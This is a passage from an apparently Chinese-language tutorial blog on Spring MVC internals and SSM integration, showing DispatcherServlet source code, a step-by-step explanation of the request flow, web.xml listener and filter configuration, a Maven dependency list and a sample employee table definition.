class="line">         processDispatchResult(processedRequest, response, mappedHandler, mv,dispatchException);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        triggerAfterCompletion(processedRequest, response, mappedHandler, ex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Throwable err) &#123;</span><br><span class="line">        triggerAfterCompletion(processedRequest, response, mappedHandler,<span class="keyword">new</span> <span class="title class_">NestedServletException</span>(<span class="string">&quot;Handler processingfailed&quot;</span>,</span><br><span class="line">                                                                                                    err));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">            <span class="comment">// Instead of postHandle and afterCompletion</span></span><br><span class="line">            <span class="keyword">if</span> (mappedHandler != <span class="literal">null</span>) &#123;</span><br><span class="line">                mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Clean up any resources used by a multipart request.</span></span><br><span class="line">            <span class="keyword">if</span> (multipartRequestParsed) &#123;</span><br><span class="line">                cleanupMultipart(processedRequest);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;                                                          </span><br></pre></td></tr></table></figure><h3 id="④processDispatchResult"><a href="#④processDispatchResult" class="headerlink" title="④processDispatchResult()"></a>④processDispatchResult()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processDispatchResult</span><span class="params">(HttpServletRequest request,HttpServletResponse response,<span class="meta">@Nullable</span> HandlerExecutionChain</span></span><br><span class="line"><span class="params">                                   mappedHandler, <span class="meta">@Nullable</span> ModelAndView mv,<span class="meta">@Nullable</span> Exception exception)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">errorView</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (exception != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (exception <span class="keyword">instanceof</span> ModelAndViewDefiningException) &#123;</span><br><span class="line">            logger.debug(<span class="string">&quot;ModelAndViewDefiningException encountered&quot;</span>,exception);</span><br><span class="line">            mv = ((ModelAndViewDefiningException) exception).getModelAndView();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> (mappedHandler != <span class="literal">null</span> ? mappedHandler.getHandler(): <span class="literal">null</span>);</span><br><span class="line">            mv = processHandlerException(request, response, handler, exception);</span><br><span class="line">            errorView = (mv != <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Did the handler return a view to render?</span></span><br><span class="line">    <span class="keyword">if</span> (mv != <span class="literal">null</span> &amp;&amp; !mv.wasCleared()) &#123;</span><br><span class="line">        <span class="comment">// 处理模型数据和渲染视图</span></span><br><span class="line">        render(mv, request, response);</span><br><span class="line">        <span class="keyword">if</span> (errorView) &#123;</span><br><span class="line">            WebUtils.clearErrorRequestAttributes(request);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">            logger.trace(<span class="string">&quot;No view rendering, null ModelAndView returned.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (WebAsyncUtils.getAsyncManager(request).isConcurrentHandlingStarted()) &#123;</span><br><span class="line">        <span class="comment">// Concurrent handling started during a forward</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mappedHandler != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Exception (if any) is already handled..</span></span><br><span class="line">        <span class="comment">// 调用拦截器的afterCompletion()</span></span><br><span class="line">        mappedHandler.triggerAfterCompletion(request, response, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;                                   </span><br></pre></td></tr></table></figure><h2 id="14-4、SpringMVC的执行流程"><a href="#14-4、SpringMVC的执行流程" class="headerlink" title="14.4、SpringMVC的执行流程"></a>14.4、SpringMVC的执行流程</h2><p>\1) 用户向服务器发送请求，请求被SpringMVC 前端控制器 DispatcherServlet捕获。</p><p>\2) DispatcherServlet对请求URL进行解析，得到请求资源标识符（URI），判断请求URI对应的映射：</p><p>a) 不存在</p><p>i. 再判断是否配置了mvc:default-servlet-handler</p><p>ii. 如果没配置，则控制台报映射查找不到，客户端展示404错误</p><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/34.png"></p><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/35.png"></p><p>iii. 如果有配置，则访问目标资源（一般为静态资源，如：JS,CSS,HTML），找不到客户端也会展示404</p><p>错误</p><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/36.png"></p><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/37.png"></p><p>b) 存在则执行下面的流程</p><p>\3) 根据该URI，调用HandlerMapping获得该Handler配置的所有相关的对象（包括Handler对象以及</p><p>Handler对象对应的拦截器），最后以HandlerExecutionChain执行链对象的形式返回。</p><p>\4) DispatcherServlet 根据获得的Handler，选择一个合适的HandlerAdapter。</p><p>\5) 如果成功获得HandlerAdapter，此时将开始执行拦截器的preHandler(…)方法【正向】</p><p>\6) 提取Request中的模型数据，填充Handler入参，开始执行Handler（Controller)方法，处理请求。</p><p>在填充Handler的入参过程中，根据你的配置，Spring将帮你做一些额外的工作：</p><p>a) HttpMessageConveter： 将请求消息（如Json、xml等数据）转换成一个对象，将对象转换为指定</p><p>的响应信息</p><p>b) 数据转换：对请求消息进行数据转换。如String转换成Integer、Double等</p><p>c) 数据格式化：对请求消息进行数据格式化。 如将字符串转换成格式化数字或格式化日期等</p><p>d) 数据验证： 验证数据的有效性（长度、格式等），验证结果存储到BindingResult或Error中</p><p>\7) Handler执行完成后，向DispatcherServlet 返回一个ModelAndView对象。</p><p>\8) 此时将开始执行拦截器的postHandle(…)方法【逆向】。</p><p>\9) 根据返回的ModelAndView（此时会判断是否存在异常：如果存在异常，则执行</p><p>HandlerExceptionResolver进行异常处理）选择一个适合的ViewResolver进行视图解析，根据Model</p><p>和View，来渲染视图。</p><p>\10) 渲染视图完毕执行拦截器的afterCompletion(…)方法【逆向】。</p><p>\11) 将渲染结果返回给客户端。</p><h1 id="四、SSM整合"><a href="#四、SSM整合" class="headerlink" title="四、SSM整合"></a>四、SSM整合</h1><p>4.1、ContextLoaderListener</p><p>Spring提供了监听器ContextLoaderListener，实现ServletContextListener接口，可监听</p><p>ServletContext的状态，在web服务器的启动，读取Spring的配置文件，创建Spring的IOC容器。web</p><p>应用中必须在web.xml中配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        配置Spring的监听器，在服务器启动时加载Spring的配置文件</span></span><br><span class="line"><span class="comment">        Spring配置文件默认位置和名称：/WEB-INF/applicationContext.xml</span></span><br><span class="line"><span class="comment">        可通过上下文参数自定义Spring配置文件的位置和名称</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--自定义Spring配置文件的位置和名称--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:spring.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-2、准备工作"><a href="#4-2、准备工作" class="headerlink" title="4.2、准备工作"></a>4.2、准备工作</h2><h3 id="①创建Maven-Module"><a href="#①创建Maven-Module" class="headerlink" title="①创建Maven Module"></a>①创建Maven Module</h3><h3 id="②导入依赖"><a href="#②导入依赖" class="headerlink" title="②导入依赖"></a>②导入依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">spring.version</span>&gt;</span>5.3.1<span class="tag">&lt;/<span class="name">spring.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--springmvc--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aspects<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Mybatis核心 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--mybatis和spring的整合包--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 连接池 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- junit测试 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- MySQL驱动 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- log4j日志 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.github.pagehelper/pagehelper --&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.pagehelper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>pagehelper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 日志 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ServletAPI --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.12.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Spring5和Thymeleaf整合包 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.thymeleaf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>thymeleaf-spring5<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.12.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span> </span><br></pre></td></tr></table></figure><h3 id="③创建表"><a href="#③创建表" class="headerlink" title="③创建表"></a>③创建表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `t_emp` (</span><br><span class="line">    `emp_id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">    `emp_name` varchar(20) DEFAULT NULL,</span><br><span class="line">    `age` int(11) DEFAULT NULL,</span><br><span class="line">    `sex` char(1) DEFAULT NULL,</span><br><span class="line">    `email` varchar(50) DEFAULT NULL,</span><br><span class="line">    PRIMARY KEY (`emp_id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8</span><br></pre></td></tr></table></figure><h2 id="4-3、配置web-xml"><a href="#4-3、配置web-xml" class="headerlink" title="4.3、配置web.xml"></a>4.3、配置web.xml</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置Spring的编码过滤器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span 